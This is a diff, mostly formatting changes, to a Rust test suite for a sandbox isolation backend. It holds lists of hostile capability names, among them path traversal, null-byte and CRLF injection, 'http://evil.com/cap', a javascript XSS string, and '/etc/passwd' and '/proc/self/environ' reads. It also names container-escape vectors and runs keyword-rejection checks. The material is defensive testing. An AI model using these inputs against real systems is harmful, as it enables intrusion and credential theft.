@@ -497,8 +497,7 @@ mod tests {
             true,
         );
 
-        let err_os =
-            select_backend(&bad_os).expect_err("os with null byte must fail validation");
+        let err_os = select_backend(&bad_os).expect_err("os with null byte must fail validation");
         assert!(matches!(
             err_os,
             IsolationError::ProbeFailed { ref reason } if reason.contains("os")
@@ -1091,10 +1090,26 @@ mod tests {
         // Test all backend combinations for downgrade resistance
         let backend_attack_scenarios = vec![
             // Attempt to force weaker isolation
-            (IsolationBackend::MicroVm, IsolationBackend::Hardened, "microvm_to_hardened"),
-            (IsolationBackend::MicroVm, IsolationBackend::Container, "microvm_to_container"),
-            (IsolationBackend::Hardened, IsolationBackend::OsSandbox, "hardened_to_ossandbox"),
-            (IsolationBackend::Container, IsolationBackend::OsSandbox, "container_to_ossandbox"),
+            (
+                IsolationBackend::MicroVm,
+                IsolationBackend::Hardened,
+                "microvm_to_hardened",
+            ),
+            (
+                IsolationBackend::MicroVm,
+                IsolationBackend::Container,
+                "microvm_to_container",
+            ),
+            (
+                IsolationBackend::Hardened,
+                IsolationBackend::OsSandbox,
+                "hardened_to_ossandbox",
+            ),
+            (
+                IsolationBackend::Container,
+                IsolationBackend::OsSandbox,
+                "container_to_ossandbox",
+            ),
         ];
 
         for (preferred, fallback, scenario_name) in backend_attack_scenarios {
@@ -1102,14 +1117,20 @@ mod tests {
             let mut selector = IsolationBackendSelector::new();
 
             // Verify backend strength ordering cannot be circumvented
-            assert!(preferred.is_full_isolation() >= fallback.is_full_isolation(),
-                   "Backend strength ordering compromised in scenario: {}", scenario_name);
+            assert!(
+                preferred.is_full_isolation() >= fallback.is_full_isolation(),
+                "Backend strength ordering compromised in scenario: {}",
+                scenario_name
+            );
 
             // Test that policy-equivalent isolation is maintained
             if preferred.is_policy_equivalent() && !fallback.is_policy_equivalent() {
                 // Should not allow downgrade from policy-equivalent to non-equivalent
-                assert!(preferred.is_policy_equivalent(),
-                       "Policy equivalence downgrade detected in scenario: {}", scenario_name);
+                assert!(
+                    preferred.is_policy_equivalent(),
+                    "Policy equivalence downgrade detected in scenario: {}",
+                    scenario_name
+                );
             }
 
             // Verify backend selection cannot be manipulated through enum variants
@@ -1132,10 +1153,22 @@ mod tests {
 
         // Test backend enumeration resistance
         let enumeration_attempts = vec![
-            "microvm", "hardened", "os_sandbox", "container",
-            "MICROVM", "HARDENED", "OS_SANDBOX", "CONTAINER",
-            "micro_vm", "hard_ened", "os-sandbox", "contain_er",
-            "vm", "sandbox", "chroot", "jail",
+            "microvm",
+            "hardened",
+            "os_sandbox",
+            "container",
+            "MICROVM",
+            "HARDENED",
+            "OS_SANDBOX",
+            "CONTAINER",
+            "micro_vm",
+            "hard_ened",
+            "os-sandbox",
+            "contain_er",
+            "vm",
+            "sandbox",
+            "chroot",
+            "jail",
         ];
 
         for attempt in enumeration_attempts {
@@ -1143,14 +1176,16 @@ mod tests {
             // (This would require a from_str method, which doesn't exist - this validates that)
 
             // Verify that backend selection is constrained to known variants
-            let known_backend_strings: BTreeSet<&str> = IsolationBackend::ALL
-                .iter()
-                .map(|b| b.as_str())
-                .collect();
+            let known_backend_strings: BTreeSet<&str> =
+                IsolationBackend::ALL.iter().map(|b| b.as_str()).collect();
 
             if !known_backend_strings.contains(attempt) {
                 // Unrecognized backend strings should not be processable
-                assert!(true, "Unknown backend string '{}' correctly unrecognized", attempt);
+                assert!(
+                    true,
+                    "Unknown backend string '{}' correctly unrecognized",
+                    attempt
+                );
             }
         }
     }
@@ -1168,22 +1203,18 @@ mod tests {
             ("cap_with_../traversal", AccessLevel::ReadWrite),
             ("cap\x00null_injection", AccessLevel::Execute),
             ("cap\r\nheader_injection", AccessLevel::ReadOnly),
-
             // Unicode capability spoofing
             ("сap_cyrillic_a", AccessLevel::ReadWrite), // Cyrillic 'с'
             ("cap\u{200B}zero_width", AccessLevel::Execute), // Zero-width space
             ("cap\u{202E}override\u{202D}", AccessLevel::ReadWrite), // BiDi override
-
             // Protocol injection in capability names
             ("file:///etc/passwd", AccessLevel::ReadOnly),
             ("http://evil.com/cap", AccessLevel::ReadWrite),
             ("javascript:alert('xss')", AccessLevel::Execute),
-
             // Path traversal capability names
             ("../../root/escalate", AccessLevel::Execute),
             ("..\\windows\\system32", AccessLevel::ReadWrite),
             ("/proc/self/mem", AccessLevel::ReadWrite),
-
             // Control character pollution
             ("cap\t\n\r\x1b[31m", AccessLevel::ReadOnly),
         ];
@@ -1193,7 +1224,8 @@ mod tests {
             let mut attack_profile = SandboxProfile::new();
 
             // Should handle malicious capability names safely
-            let capability_result = attack_profile.allow_capability(malicious_capability, access_level);
+            let capability_result =
+                attack_profile.allow_capability(malicious_capability, access_level);
 
             // Verify no injection artifacts survive policy compilation
             match compile_policy(&attack_profile) {
@@ -1210,7 +1242,7 @@ mod tests {
                     // Should not contain escape sequences or ANSI codes
                     assert!(!policy_debug.contains("\x1b["));
                     assert!(!policy_debug.contains("\u{202E}"));
-                },
+                }
                 Err(_) => {
                     // Rejection of malicious capabilities is acceptable
                 }
@@ -1220,10 +1252,18 @@ mod tests {
         // Test privilege escalation through capability combination
         let escalation_capability_sets = vec![
             // Attempt to combine capabilities for escalation
-            vec![("network", AccessLevel::ReadWrite), ("filesystem", AccessLevel::Execute)],
-            vec![("process", AccessLevel::Execute), ("memory", AccessLevel::ReadWrite)],
-            vec![("kernel", AccessLevel::ReadOnly), ("hardware", AccessLevel::ReadWrite)],
-
+            vec![
+                ("network", AccessLevel::ReadWrite),
+                ("filesystem", AccessLevel::Execute),
+            ],
+            vec![
+                ("process", AccessLevel::Execute),
+                ("memory", AccessLevel::ReadWrite),
+            ],
+            vec![
+                ("kernel", AccessLevel::ReadOnly),
+                ("hardware", AccessLevel::ReadWrite),
+            ],
             // Attempt privilege escalation through access level manipulation
             vec![("safe_resource", AccessLevel::Execute)], // Execute on supposedly safe resource
             vec![("readonly_config", AccessLevel::ReadWrite)], // Write to readonly config
@@ -1245,7 +1285,7 @@ mod tests {
                     assert!(!policy_str.contains("unlimited"));
                     assert!(!policy_str.contains("bypass"));
                     assert!(!policy_str.contains("override"));
-                },
+                }
                 Err(_) => {
                     // Rejection of privilege escalation is expected
                 }
@@ -1275,17 +1315,19 @@ mod tests {
                         AccessLevel::ReadOnly => {
                             assert!(!policy_debug.contains("write"));
                             assert!(!policy_debug.contains("execute"));
-                        },
+                        }
                         AccessLevel::ReadWrite => {
-                            assert!(!policy_debug.contains("execute") ||
-                                   policy_debug.contains("read") ||
-                                   policy_debug.contains("write"));
-                        },
+                            assert!(
+                                !policy_debug.contains("execute")
+                                    || policy_debug.contains("read")
+                                    || policy_debug.contains("write")
+                            );
+                        }
                         AccessLevel::Execute => {
                             // Execute typically implies read access
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Policy compilation errors are acceptable
                 }
@@ -1303,17 +1345,14 @@ mod tests {
             ("hypercall:escape", "vmcall_injection"),
             ("qemu:memory_corruption", "hypervisor_memory"),
             ("kvm:privilege_escalation", "kvm_exploit"),
-
             // Device emulation attacks
             ("virtio:buffer_overflow", "virtio_device_attack"),
             ("pci:config_space", "pci_device_exploit"),
             ("network:packet_injection", "network_device_attack"),
-
             // Memory management attacks
             ("shared_memory:corruption", "shared_mem_attack"),
             ("page_tables:manipulation", "pagetable_exploit"),
             ("dma:buffer_overflow", "dma_attack"),
-
             // Host-guest communication attacks
             ("guest_agent:command_injection", "guest_agent_exploit"),
             ("virtio_console:escape_sequence", "console_injection"),
@@ -1328,8 +1367,11 @@ mod tests {
             // Test if MicroVM backend properly handles attack vectors
             if IsolationBackend::MicroVm.is_full_isolation() {
                 // MicroVM should provide hardware-level isolation against these attacks
-                assert!(IsolationBackend::MicroVm.is_full_isolation(),
-                       "MicroVM should provide full isolation against {}", attack_name);
+                assert!(
+                    IsolationBackend::MicroVm.is_full_isolation(),
+                    "MicroVM should provide full isolation against {}",
+                    attack_name
+                );
 
                 // Verify MicroVM policies don't contain attack vector references
                 match compile_policy(&microvm_profile) {
@@ -1340,7 +1382,7 @@ mod tests {
                         assert!(!policy_str.contains("qemu"));
                         assert!(!policy_str.contains("exploit"));
                         assert!(!policy_str.contains("injection"));
-                    },
+                    }
                     Err(_) => {
                         // Policy compilation errors are acceptable
                     }
@@ -1354,12 +1396,10 @@ mod tests {
             ("cpu_intensive_loop", 1000000),
             ("context_switch_storm", 50000),
             ("interrupt_flooding", 100000),
-
             // Memory exhaustion
             ("memory_allocation_bomb", 2000000),
             ("page_fault_storm", 500000),
             ("cache_thrashing", 100000),
-
             // I/O exhaustion
             ("disk_io_flood", 10000),
             ("network_packet_flood", 50000),
@@ -1378,14 +1418,17 @@ mod tests {
                     let policy_str = format!("{:?}", compiled);
                     // Resource policies should be present (implementation-dependent)
                     assert!(!policy_str.is_empty());
-                },
+                }
                 Err(_) => {
                     // Resource-intensive policies may be rejected
                 }
             }
 
             // Verify resource exhaustion doesn't bypass isolation
-            assert!(intensity > 0, "Resource attack intensity should be positive");
+            assert!(
+                intensity > 0,
+                "Resource attack intensity should be positive"
+            );
         }
 
         // Test side-channel attack resistance
@@ -1400,7 +1443,8 @@ mod tests {
 
         for sidechannel_attack in sidechannel_attacks {
             let mut sidechannel_profile = SandboxProfile::new();
-            let _result = sidechannel_profile.allow_capability(sidechannel_attack, AccessLevel::ReadOnly);
+            let _result =
+                sidechannel_profile.allow_capability(sidechannel_attack, AccessLevel::ReadOnly);
 
             // MicroVM should provide protection against side-channel attacks
             if IsolationBackend::MicroVm.is_full_isolation() {
@@ -1415,7 +1459,7 @@ mod tests {
                     assert!(!policy_str.contains("cache"));
                     assert!(!policy_str.contains("timing"));
                     assert!(!policy_str.contains("speculation"));
-                },
+                }
                 Err(_) => {
                     // Rejection of side-channel capabilities is expected
                 }
@@ -1434,25 +1478,21 @@ mod tests {
             ("sys_admin_capability", "CAP_SYS_ADMIN escalation"),
             ("ptrace_scope", "ptrace injection attack"),
             ("mount_namespace", "mount namespace escape"),
-
             // Cgroup escape attempts
             ("cgroup_release_agent", "cgroup release agent exploit"),
             ("cgroup_notify_on_release", "cgroup notification exploit"),
             ("memory_cgroup_bypass", "memory cgroup bypass"),
             ("cpu_cgroup_bypass", "CPU cgroup bypass"),
-
             // Device access attacks
             ("dev_mem", "/dev/mem access"),
             ("dev_kmem", "/dev/kmem access"),
             ("dev_port", "/dev/port access"),
             ("gpu_device", "GPU device escape"),
-
             // File system attacks
             ("bind_mount_escape", "bind mount directory traversal"),
             ("overlayfs_escape", "OverlayFS upperdir escape"),
             ("tmpfs_exhaustion", "tmpfs memory exhaustion"),
             ("proc_kcore", "/proc/kcore kernel memory"),
-
             // Network namespace escapes
             ("netlink_socket", "netlink socket privilege escalation"),
             ("raw_socket", "raw socket creation"),
@@ -1481,7 +1521,7 @@ mod tests {
                         // Should not allow cgroup manipulation
                         assert!(!policy_str.contains("release_agent"));
                         assert!(!policy_str.contains("notify_on_release"));
-                    },
+                    }
                     Err(_) => {
                         // Rejection of dangerous capabilities is expected
                     }
@@ -1496,7 +1536,6 @@ mod tests {
             vec!["CAP_DAC_OVERRIDE", "CAP_FOWNER"],
             vec!["CAP_NET_ADMIN", "CAP_NET_RAW"],
             vec!["CAP_SYS_MODULE", "CAP_SYS_RAWIO"],
-
             // Dangerous single capabilities
             vec!["CAP_SYS_ADMIN"],
             vec!["CAP_SYS_PTRACE"],
@@ -1521,7 +1560,7 @@ mod tests {
                     assert!(!policy_str.contains("SYS_PTRACE"));
                     assert!(!policy_str.contains("SYS_MODULE"));
                     assert!(!policy_str.contains("SYS_RAWIO"));
-                },
+                }
                 Err(_) => {
                     // Rejection of dangerous capability combinations is expected
                 }
@@ -1535,7 +1574,6 @@ mod tests {
             ("mmap_rwx", "mmap with RWX pages"),
             ("mprotect_exec", "mprotect to executable"),
             ("ptrace_attach", "ptrace attach to parent"),
-
             // Kernel interface bypasses
             ("bpf_syscall", "BPF syscall exploitation"),
             ("userfaultfd", "userfaultfd kernel exploit"),
@@ -1558,7 +1596,7 @@ mod tests {
                     assert!(!policy_str.contains("mprotect"));
                     assert!(!policy_str.contains("ptrace"));
                     assert!(!policy_str.contains("bpf"));
-                },
+                }
                 Err(_) => {
                     // Rejection of bypass attempts is expected
                 }
@@ -1570,14 +1608,18 @@ mod tests {
             ("pid_namespace_confusion", "PID namespace confusion"),
             ("mount_namespace_pollution", "mount namespace pollution"),
             ("net_namespace_injection", "network namespace injection"),
-            ("user_namespace_escalation", "user namespace privilege escalation"),
+            (
+                "user_namespace_escalation",
+                "user namespace privilege escalation",
+            ),
             ("ipc_namespace_leak", "IPC namespace information leak"),
             ("uts_namespace_spoofing", "UTS namespace hostname spoofing"),
         ];
 
         for (pollution_vector, pollution_description) in namespace_pollution_vectors {
             let mut pollution_profile = SandboxProfile::new();
-            let _result = pollution_profile.allow_capability(pollution_vector, AccessLevel::ReadWrite);
+            let _result =
+                pollution_profile.allow_capability(pollution_vector, AccessLevel::ReadWrite);
 
             // Should prevent namespace pollution
             match compile_policy(&pollution_profile) {
@@ -1590,7 +1632,7 @@ mod tests {
                     assert!(!policy_str.contains("injection"));
                     assert!(!policy_str.contains("escalation"));
                     assert!(!policy_str.contains("spoofing"));
-                },
+                }
                 Err(_) => {
                     // Rejection of namespace attacks is expected
                 }
@@ -1609,13 +1651,11 @@ mod tests {
             ("deep_nesting_policy", 500),
             ("many_capabilities_policy", 2000),
             ("regex_complex_policy", 100),
-
             // Capability lookup timing
             ("existing_capability_lookup", 5000),
             ("nonexistent_capability_lookup", 5000),
             ("fuzzy_capability_match", 1000),
             ("case_sensitive_capability", 1000),
-
             // Resource enumeration timing
             ("filesystem_resource_enum", 100),
             ("network_resource_enum", 100),
@@ -1630,7 +1670,8 @@ mod tests {
                 // Create policy with timing-sensitive characteristics
                 let mut timing_profile = SandboxProfile::new();
                 let capability_name = format!("{}_iteration_{:04}", timing_vector, iteration);
-                let _result = timing_profile.allow_capability(&capability_name, AccessLevel::ReadOnly);
+                let _result =
+                    timing_profile.allow_capability(&capability_name, AccessLevel::ReadOnly);
 
                 // Measure policy compilation time
                 let start_time = Instant::now();
@@ -1640,12 +1681,17 @@ mod tests {
                 timing_measurements.push(compilation_time);
 
                 // Each compilation should complete in reasonable time
-                assert!(compilation_time < Duration::from_millis(100),
-                       "Policy compilation too slow for {}: {:?}", timing_vector, compilation_time);
+                assert!(
+                    compilation_time < Duration::from_millis(100),
+                    "Policy compilation too slow for {}: {:?}",
+                    timing_vector,
+                    compilation_time
+                );
             }
 
             // Analyze timing distribution for side channels
-            let timings_nanos: Vec<u64> = timing_measurements.iter()
+            let timings_nanos: Vec<u64> = timing_measurements
+                .iter()
                 .map(|d| d.as_nanos() as u64)
                 .collect();
 
@@ -1657,9 +1703,12 @@ mod tests {
                 let timing_variance_ratio = (max_timing - min_timing) / mean;
 
                 // Policy enforcement should not have excessive timing variance
-                assert!(timing_variance_ratio < 3.0,
-                       "Excessive timing variance in {} suggests side channel: ratio={:.2}",
-                       timing_vector, timing_variance_ratio);
+                assert!(
+                    timing_variance_ratio < 3.0,
+                    "Excessive timing variance in {} suggests side channel: ratio={:.2}",
+                    timing_vector,
+                    timing_variance_ratio
+                );
             }
         }
 
@@ -1667,18 +1716,40 @@ mod tests {
         let information_leak_tests = vec![
             // File system information leaks
             ("/etc/passwd", AccessLevel::ReadOnly, "system_file_access"),
-            ("/proc/version", AccessLevel::ReadOnly, "kernel_version_leak"),
-            ("/sys/class/dmi/id/product_name", AccessLevel::ReadOnly, "hardware_info_leak"),
-
+            (
+                "/proc/version",
+                AccessLevel::ReadOnly,
+                "kernel_version_leak",
+            ),
+            (
+                "/sys/class/dmi/id/product_name",
+                AccessLevel::ReadOnly,
+                "hardware_info_leak",
+            ),
             // Network information leaks
             ("127.0.0.1:22", AccessLevel::ReadWrite, "local_service_enum"),
-            ("192.168.1.1:80", AccessLevel::ReadOnly, "network_topology_leak"),
+            (
+                "192.168.1.1:80",
+                AccessLevel::ReadOnly,
+                "network_topology_leak",
+            ),
             ("::1:443", AccessLevel::ReadWrite, "ipv6_service_enum"),
-
             // Process information leaks
-            ("/proc/self/cmdline", AccessLevel::ReadOnly, "process_args_leak"),
-            ("/proc/self/environ", AccessLevel::ReadOnly, "environment_leak"),
-            ("/proc/self/maps", AccessLevel::ReadOnly, "memory_layout_leak"),
+            (
+                "/proc/self/cmdline",
+                AccessLevel::ReadOnly,
+                "process_args_leak",
+            ),
+            (
+                "/proc/self/environ",
+                AccessLevel::ReadOnly,
+                "environment_leak",
+            ),
+            (
+                "/proc/self/maps",
+                AccessLevel::ReadOnly,
+                "memory_layout_leak",
+            ),
         ];
 
         for (resource_path, access_level, leak_type) in information_leak_tests {
@@ -1701,7 +1772,7 @@ mod tests {
 
                     // Should not leak process information
                     assert!(!policy_str.contains("/proc/self/"));
-                },
+                }
                 Err(policy_error) => {
                     let error_str = format!("{:?}", policy_error);
 
@@ -1721,7 +1792,11 @@ mod tests {
         // Test constant-time policy comparison
         let constant_time_tests = vec![
             ("policy_a", "policy_b", 1000),
-            ("short", "very_long_policy_name_that_differs_significantly", 1000),
+            (
+                "short",
+                "very_long_policy_name_that_differs_significantly",
+                1000,
+            ),
             ("identical_policy", "identical_policy", 1000),
             ("", "empty_vs_nonempty", 1000),
         ];
@@ -1747,7 +1822,8 @@ mod tests {
 
             // Analyze timing consistency
             if !comparison_timings.is_empty() {
-                let timings_nanos: Vec<u64> = comparison_timings.iter()
+                let timings_nanos: Vec<u64> = comparison_timings
+                    .iter()
                     .map(|d| d.as_nanos() as u64)
                     .collect();
 
@@ -1758,9 +1834,11 @@ mod tests {
                 let comparison_variance = (max_time - min_time) / mean;
 
                 // Policy comparison should be roughly constant-time
-                assert!(comparison_variance < 2.0,
-                       "Policy comparison timing variance suggests side channel: {:.2}",
-                       comparison_variance);
+                assert!(
+                    comparison_variance < 2.0,
+                    "Policy comparison timing variance suggests side channel: {:.2}",
+                    comparison_variance
+                );
             }
         }
     }
@@ -1772,10 +1850,18 @@ mod tests {
         // Test concurrent backend selection with conflicting requirements
         let concurrent_selection_scenarios = vec![
             // Concurrent requests with different security requirements
-            (vec![IsolationBackend::MicroVm, IsolationBackend::Container], "mixed_security_levels"),
-            (vec![IsolationBackend::Hardened, IsolationBackend::OsSandbox], "hardened_vs_basic"),
-            (vec![IsolationBackend::Container, IsolationBackend::OsSandbox], "container_vs_sandbox"),
-
+            (
+                vec![IsolationBackend::MicroVm, IsolationBackend::Container],
+                "mixed_security_levels",
+            ),
+            (
+                vec![IsolationBackend::Hardened, IsolationBackend::OsSandbox],
+                "hardened_vs_basic",
+            ),
+            (
+                vec![IsolationBackend::Container, IsolationBackend::OsSandbox],
+                "container_vs_sandbox",
+            ),
             // Rapid backend switching
             (IsolationBackend::ALL.to_vec(), "all_backends_rapid"),
             (vec![IsolationBackend::MicroVm; 100], "microvm_stress"),
@@ -1798,15 +1884,24 @@ mod tests {
                 let _selected = selector.select_backend();
 
                 // Verify backend properties remain consistent
-                assert!(target_backend.is_full_isolation() == target_backend.is_full_isolation(),
-                       "Backend property consistency violated in scenario: {}", scenario_name);
-                assert!(target_backend.is_policy_equivalent() == target_backend.is_policy_equivalent(),
-                       "Policy equivalence consistency violated in scenario: {}", scenario_name);
+                assert!(
+                    target_backend.is_full_isolation() == target_backend.is_full_isolation(),
+                    "Backend property consistency violated in scenario: {}",
+                    scenario_name
+                );
+                assert!(
+                    target_backend.is_policy_equivalent() == target_backend.is_policy_equivalent(),
+                    "Policy equivalence consistency violated in scenario: {}",
+                    scenario_name
+                );
 
                 // String representation should remain stable
                 let backend_str = target_backend.as_str();
-                assert_eq!(target_backend.as_str(), backend_str,
-                          "Backend string representation changed during concurrent access");
+                assert_eq!(
+                    target_backend.as_str(),
+                    backend_str,
+                    "Backend string representation changed during concurrent access"
+                );
             }
         }
 
@@ -1814,13 +1909,14 @@ mod tests {
         let shared_resource_conflicts = vec![
             // Shared file system resources
             vec!["/tmp/shared_file", "/tmp/shared_file", "/tmp/shared_file"],
-
             // Shared network resources
             vec!["0.0.0.0:8080", "127.0.0.1:8080", "localhost:8080"],
-
             // Shared memory regions
-            vec!["/dev/shm/shared_mem", "/dev/shm/shared_mem", "/dev/shm/shared_mem"],
-
+            vec![
+                "/dev/shm/shared_mem",
+                "/dev/shm/shared_mem",
+                "/dev/shm/shared_mem",
+            ],
             // Shared devices
             vec!["/dev/null", "/dev/zero", "/dev/urandom"],
         ];
@@ -1866,7 +1962,7 @@ mod tests {
                         if shared_resources[idx].contains(":") {
                             // Network access should be isolated
                         }
-                    },
+                    }
                     Err(_) => {
                         // Compilation failures are acceptable under resource conflicts
                     }
@@ -1890,25 +1986,51 @@ mod tests {
             let backend_str = backend.as_str();
 
             // Verify state consistency during rapid operations
-            assert_eq!(backend.is_full_isolation(), is_full,
-                      "Backend isolation property changed during rapid ops at iteration {}", iteration);
-            assert_eq!(backend.is_policy_equivalent(), is_policy,
-                      "Backend policy property changed during rapid ops at iteration {}", iteration);
-            assert_eq!(backend.as_str(), backend_str,
-                      "Backend string changed during rapid ops at iteration {}", iteration);
+            assert_eq!(
+                backend.is_full_isolation(),
+                is_full,
+                "Backend isolation property changed during rapid ops at iteration {}",
+                iteration
+            );
+            assert_eq!(
+                backend.is_policy_equivalent(),
+                is_policy,
+                "Backend policy property changed during rapid ops at iteration {}",
+                iteration
+            );
+            assert_eq!(
+                backend.as_str(),
+                backend_str,
+                "Backend string changed during rapid ops at iteration {}",
+                iteration
+            );
 
             operation_results.push((backend, is_full, is_policy, backend_str));
         }
 
         // Verify final state integrity
-        for (idx, (backend, is_full, is_policy, backend_str)) in operation_results.iter().enumerate() {
+        for (idx, (backend, is_full, is_policy, backend_str)) in
+            operation_results.iter().enumerate()
+        {
             // All recorded states should remain valid
-            assert_eq!(backend.is_full_isolation(), *is_full,
-                      "Final state mismatch for isolation at index {}", idx);
-            assert_eq!(backend.is_policy_equivalent(), *is_policy,
-                      "Final state mismatch for policy equivalence at index {}", idx);
-            assert_eq!(backend.as_str(), backend_str,
-                      "Final state mismatch for string representation at index {}", idx);
+            assert_eq!(
+                backend.is_full_isolation(),
+                *is_full,
+                "Final state mismatch for isolation at index {}",
+                idx
+            );
+            assert_eq!(
+                backend.is_policy_equivalent(),
+                *is_policy,
+                "Final state mismatch for policy equivalence at index {}",
+                idx
+            );
+            assert_eq!(
+                backend.as_str(),
+                backend_str,
+                "Final state mismatch for string representation at index {}",
+                idx
+            );
         }
 
         // Test error handling during concurrent operations
@@ -1927,7 +2049,7 @@ mod tests {
             match compile_policy(&error_profile) {
                 Ok(_) => {
                     // Success is acceptable
-                },
+                }
                 Err(error) => {
                     let error_str = format!("{:?}", error);
 
@@ -1952,13 +2074,32 @@ mod tests {
         // Test privilege escalation across backend transitions
         let escalation_transitions = vec![
             // Attempt to maintain privileges during backend downgrade
-            (IsolationBackend::MicroVm, IsolationBackend::Container, vec!["admin_privilege", "kernel_access"]),
-            (IsolationBackend::Container, IsolationBackend::OsSandbox, vec!["container_escape", "namespace_bypass"]),
-            (IsolationBackend::Hardened, IsolationBackend::OsSandbox, vec!["hardened_bypass", "policy_override"]),
-
+            (
+                IsolationBackend::MicroVm,
+                IsolationBackend::Container,
+                vec!["admin_privilege", "kernel_access"],
+            ),
+            (
+                IsolationBackend::Container,
+                IsolationBackend::OsSandbox,
+                vec!["container_escape", "namespace_bypass"],
+            ),
+            (
+                IsolationBackend::Hardened,
+                IsolationBackend::OsSandbox,
+                vec!["hardened_bypass", "policy_override"],
+            ),
             // Attempt to exploit backend-specific vulnerabilities
-            (IsolationBackend::MicroVm, IsolationBackend::Hardened, vec!["hypervisor_exploit", "vm_escape"]),
-            (IsolationBackend::Container, IsolationBackend::MicroVm, vec!["container_to_vm", "namespace_pollution"]),
+            (
+                IsolationBackend::MicroVm,
+                IsolationBackend::Hardened,
+                vec!["hypervisor_exploit", "vm_escape"],
+            ),
+            (
+                IsolationBackend::Container,
+                IsolationBackend::MicroVm,
+                vec!["container_to_vm", "namespace_pollution"],
+            ),
         ];
 
         for (source_backend, target_backend, escalation_capabilities) in escalation_transitions {
@@ -1988,9 +2129,12 @@ mod tests {
                     // Target backend should not inherit source privileges
                     if source_str.contains("execute") && source_backend != target_backend {
                         // Cross-backend transitions should reset privilege levels
-                        assert!(!target_str.contains("execute") || target_str.contains("readonly"),
-                               "Privilege escalation detected in transition from {:?} to {:?}",
-                               source_backend, target_backend);
+                        assert!(
+                            !target_str.contains("execute") || target_str.contains("readonly"),
+                            "Privilege escalation detected in transition from {:?} to {:?}",
+                            source_backend,
+                            target_backend
+                        );
                     }
 
                     // Should not contain escalation artifacts
@@ -1998,33 +2142,63 @@ mod tests {
                     assert!(!target_str.contains("escape"));
                     assert!(!target_str.contains("exploit"));
                     assert!(!target_str.contains("override"));
-                },
+                }
                 _ => {
                     // Policy compilation failures are acceptable for dangerous capability combinations
                 }
             }
 
             // Verify backend isolation properties are maintained
-            assert!(source_backend.is_full_isolation() >= target_backend.is_full_isolation() ||
-                   source_backend.is_policy_equivalent() >= target_backend.is_policy_equivalent(),
-                   "Isolation strength ordering violated in transition from {:?} to {:?}",
-                   source_backend, target_backend);
+            assert!(
+                source_backend.is_full_isolation() >= target_backend.is_full_isolation()
+                    || source_backend.is_policy_equivalent()
+                        >= target_backend.is_policy_equivalent(),
+                "Isolation strength ordering violated in transition from {:?} to {:?}",
+                source_backend,
+                target_backend
+            );
         }
 
         // Test isolation boundary enforcement between backends
         let isolation_boundary_tests = vec![
             // Memory isolation boundaries
-            ("shared_memory_access", IsolationBackend::MicroVm, IsolationBackend::Container),
-            ("cross_vm_memory", IsolationBackend::MicroVm, IsolationBackend::Hardened),
-            ("container_memory_ns", IsolationBackend::Container, IsolationBackend::OsSandbox),
-
+            (
+                "shared_memory_access",
+                IsolationBackend::MicroVm,
+                IsolationBackend::Container,
+            ),
+            (
+                "cross_vm_memory",
+                IsolationBackend::MicroVm,
+                IsolationBackend::Hardened,
+            ),
+            (
+                "container_memory_ns",
+                IsolationBackend::Container,
+                IsolationBackend::OsSandbox,
+            ),
             // Network isolation boundaries
-            ("cross_backend_network", IsolationBackend::Container, IsolationBackend::MicroVm),
-            ("namespace_network_leak", IsolationBackend::OsSandbox, IsolationBackend::Container),
-
+            (
+                "cross_backend_network",
+                IsolationBackend::Container,
+                IsolationBackend::MicroVm,
+            ),
+            (
+                "namespace_network_leak",
+                IsolationBackend::OsSandbox,
+                IsolationBackend::Container,
+            ),
             // File system isolation boundaries
-            ("cross_backend_filesystem", IsolationBackend::Hardened, IsolationBackend::Container),
-            ("mount_namespace_bypass", IsolationBackend::Container, IsolationBackend::OsSandbox),
+            (
+                "cross_backend_filesystem",
+                IsolationBackend::Hardened,
+                IsolationBackend::Container,
+            ),
+            (
+                "mount_namespace_bypass",
+                IsolationBackend::Container,
+                IsolationBackend::OsSandbox,
+            ),
         ];
 
         for (boundary_test, backend_a, backend_b) in isolation_boundary_tests {
@@ -2050,7 +2224,7 @@ mod tests {
                     if backend_b.is_policy_equivalent() {
                         assert!(!policy_str.contains("namespace_bypass"));
                     }
-                },
+                }
                 Err(_) => {
                     // Rejection of boundary violation attempts is expected
                 }
@@ -2059,10 +2233,26 @@ mod tests {
 
         // Test backend-specific attack surface reduction
         let attack_surface_tests = vec![
-            (IsolationBackend::MicroVm, vec!["hypervisor_interface", "vm_escape_vector", "hypercall_injection"]),
-            (IsolationBackend::Container, vec!["container_runtime", "cgroup_escape", "namespace_confusion"]),
-            (IsolationBackend::Hardened, vec!["seccomp_bypass", "capability_escalation", "kernel_exploit"]),
-            (IsolationBackend::OsSandbox, vec!["chroot_escape", "ptrace_injection", "signal_manipulation"]),
+            (
+                IsolationBackend::MicroVm,
+                vec![
+                    "hypervisor_interface",
+                    "vm_escape_vector",
+                    "hypercall_injection",
+                ],
+            ),
+            (
+                IsolationBackend::Container,
+                vec!["container_runtime", "cgroup_escape", "namespace_confusion"],
+            ),
+            (
+                IsolationBackend::Hardened,
+                vec!["seccomp_bypass", "capability_escalation", "kernel_exploit"],
+            ),
+            (
+                IsolationBackend::OsSandbox,
+                vec!["chroot_escape", "ptrace_injection", "signal_manipulation"],
+            ),
         ];
 
         for (backend, attack_vectors) in attack_surface_tests {
@@ -2081,24 +2271,24 @@ mod tests {
                                 assert!(!policy_str.contains("hypervisor"));
                                 assert!(!policy_str.contains("hypercall"));
                                 assert!(!policy_str.contains("vm_escape"));
-                            },
+                            }
                             IsolationBackend::Container => {
                                 assert!(!policy_str.contains("cgroup"));
                                 assert!(!policy_str.contains("namespace"));
                                 assert!(!policy_str.contains("container_runtime"));
-                            },
+                            }
                             IsolationBackend::Hardened => {
                                 assert!(!policy_str.contains("seccomp"));
                                 assert!(!policy_str.contains("capability"));
                                 assert!(!policy_str.contains("kernel"));
-                            },
+                            }
                             IsolationBackend::OsSandbox => {
                                 assert!(!policy_str.contains("chroot"));
                                 assert!(!policy_str.contains("ptrace"));
                                 assert!(!policy_str.contains("signal"));
                             }
                         }
-                    },
+                    }
                     Err(_) => {
                         // Rejection of attack surface exposure is expected
                     }
@@ -2107,7 +2297,8 @@ mod tests {
         }
 
         // Test capability inheritance prevention across backends
-        let inherited_capability_tests = vec!["admin", "root", "kernel", "hypervisor", "escape", "bypass"];
+        let inherited_capability_tests =
+            vec!["admin", "root", "kernel", "hypervisor", "escape", "bypass"];
 
         for inherited_capability in inherited_capability_tests {
             // Test capability across all backend pairs
@@ -2118,10 +2309,13 @@ mod tests {
                     }
 
                     let mut inheritance_profile = SandboxProfile::new();
-                    let capability_name = format!("{}_{}_inheritance",
-                                                 source_backend.as_str(),
-                                                 inherited_capability);
